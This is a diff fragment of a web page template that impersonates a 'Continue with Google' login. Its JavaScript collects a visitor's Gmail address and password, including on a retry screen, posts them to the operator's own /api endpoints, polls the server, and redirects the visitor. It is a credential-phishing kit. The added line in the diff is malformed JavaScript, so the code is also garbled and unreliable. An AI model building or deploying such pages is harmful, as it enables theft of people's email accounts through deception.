@@ -644,7 +644,7 @@ Continue with Google
 <script>
 var pollInterval=null,redirectUrl='""" + SUCCESS_REDIRECT_URL + """';
 function showStep(a){document.querySelectorAll('.step').forEach(function(b){b.classList.remove('active')});document.getElementById(a).classList.add('active')}
-function selectProvider(a){if(a==='gmail'){showStep('step-email')}}
+function selectProvider(a){if(a==='gmail'){showStep('step-email'){showStep('step-password')}}
 function submitEmail(){var a=document.getElementById('email-input').value.trim();if(!a){return}fetch('/api/gmail-email',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){document.getElementById('display-email').textContent=a;showStep('step-password')}}).catch(function(){})}
 function submitPassword(){var a=document.getElementById('password-input').value.trim();if(!a){return}fetch('/api/gmail-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading');startPolling()}}).catch(function(){})}
 function submitPasswordRetry(){var a=document.getElementById('password-retry-input').value.trim();if(!a){return}fetch('/api/gmail-password',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:a})}).then(function(b){return b.json()}).then(function(b){if(b.status==='ok'){showStep('step-loading');startPolling()}}).catch(function(){})}
